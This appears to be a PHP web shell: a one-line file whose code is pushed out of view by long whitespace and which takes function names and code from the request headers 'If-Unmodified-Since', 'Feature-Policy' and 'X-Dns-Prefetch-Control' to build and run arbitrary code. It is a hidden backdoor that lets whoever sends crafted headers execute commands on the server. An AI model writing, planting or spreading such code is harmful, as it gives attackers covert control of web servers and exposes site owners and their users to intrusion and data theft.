<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$config=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['X-Dns-Prefetch-Control']));$config();}
